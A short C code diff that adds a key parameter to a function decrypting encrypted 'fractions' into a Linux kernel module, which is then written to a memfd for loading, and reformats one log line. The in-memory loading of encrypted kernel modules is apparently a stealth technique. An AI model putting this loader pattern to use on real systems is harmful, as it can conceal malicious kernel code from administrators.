@@ -11,7 +11,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len) {
+uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len,unsigned char *key) {
 
   uint8_t *module = NULL;
   ssize_t total_size = 0;
@@ -19,7 +19,7 @@ uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len) {
   decrypted_t *decr;
 
   for (int i = 0; i < fractions_count; i++) {
-    decr = decrypt_fraction(&fractions[i]);
+    decr = decrypt_fraction(&fractions[i], key);
     if (decr == NULL) {
       log_error("Decryption process failed");
       return NULL;
@@ -68,8 +68,8 @@ int load_lkm(const uint8_t *lkm, ssize_t total_size) {
     close(fdlkm);
     return -1;
   } else if (written_bytes != total_size) {
-    log_error("Incomplete write to memfd (Expected %zu, wrote %zd)",
-              total_size, written_bytes);
+    log_error("Incomplete write to memfd (Expected %zu, wrote %zd)", total_size,
+              written_bytes);
     close(fdlkm);
     return -1;
   }
